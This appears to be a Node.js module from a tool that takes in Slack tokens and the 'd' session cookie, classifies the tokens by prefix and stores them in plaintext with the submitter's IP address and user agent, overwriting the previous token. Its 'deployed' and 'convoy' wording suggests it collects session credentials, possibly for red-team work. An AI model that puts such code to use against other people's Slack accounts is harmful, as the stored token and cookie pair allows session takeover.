const database = require('../database')

module.exports = {
  validateToken,
  determineTokenType,
  createTokenData,
  saveToken,
  getAllTokens,
  getTokenById,
  getTokenCount,
  deleteAllTokens
}

function validateToken (token) {
  if (!token) {
    return { valid: false, error: 'Token is required' }
  }

  if (!token.startsWith('xox') || token.length < 20) {
    return { valid: false, error: 'Invalid token format' }
  }

  return { valid: true }
}

function determineTokenType (token) {
  if (token.startsWith('xoxp-')) return 'user'
  if (token.startsWith('xoxb-')) return 'bot'
  if (token.startsWith('xoxc-')) return 'client'
  if (token.startsWith('xoxa-')) return 'app'
  if (token.startsWith('xox-')) return 'workspace'
  return 'unknown'
}

function createTokenData (options) {
  const { token, dCookie, authTestResponse, request } = options
  const team = authTestResponse.data.team ||
    authTestResponse.data.team_id || 'unknown'
  return {
    tokenValue: token,
    tokenType: determineTokenType(token),
    workspaceName: team,
    workspaceUrl: authTestResponse.data.url || null,
    dCookie: dCookie || null,
    ipAddress: request?.ip ||
      request?.connection?.remoteAddress || 'unknown',
    userAgent: request?.get('User-Agent') || 'unknown'
  }
}

function saveToken (tokenData) {
  const db = database.initialize()
  const {
    tokenValue,
    tokenType = 'unknown',
    workspaceName = 'unknown',
    workspaceUrl,
    dCookie,
    ipAddress,
    userAgent
  } = tokenData

  const deleteStmt = db.prepare('DELETE FROM tokens')
  deleteStmt.run()

  const stmt = db.prepare(`
    INSERT INTO tokens (
      tokenValue, tokenType, workspaceName, workspaceUrl,
      dCookie, ipAddress, userAgent
    )
    VALUES (?, ?, ?, ?, ?, ?, ?)
  `)

  try {
    const result = stmt.run(
      tokenValue, tokenType, workspaceName, workspaceUrl,
      dCookie, ipAddress, userAgent
    )
    console.log(
      '🔄 Token deployed - previous token overwritten ' +
      `(ID: ${result.lastInsertRowid})`
    )
    return result.lastInsertRowid
  } catch (error) {
    console.error('❌ Error deploying token:', error.message)
    throw error
  }
}

function getAllTokens () {
  const db = database.initialize()
  const stmt = db.prepare(
    'SELECT * FROM tokens ORDER BY createdAt DESC'
  )
  return stmt.all()
}

function getTokenById (id) {
  const db = database.initialize()
  const stmt = db.prepare('SELECT * FROM tokens WHERE id = ?')
  return stmt.get(id)
}

function getTokenCount () {
  const db = database.initialize()
  const stmt = db.prepare('SELECT COUNT(*) as count FROM tokens')
  const result = stmt.get()
  return result.count
}

function deleteAllTokens () {
  const db = database.initialize()
  const deleteStmt = db.prepare('DELETE FROM tokens')
  deleteStmt.run()
  console.log('🗑️ All tokens removed from convoy')
}
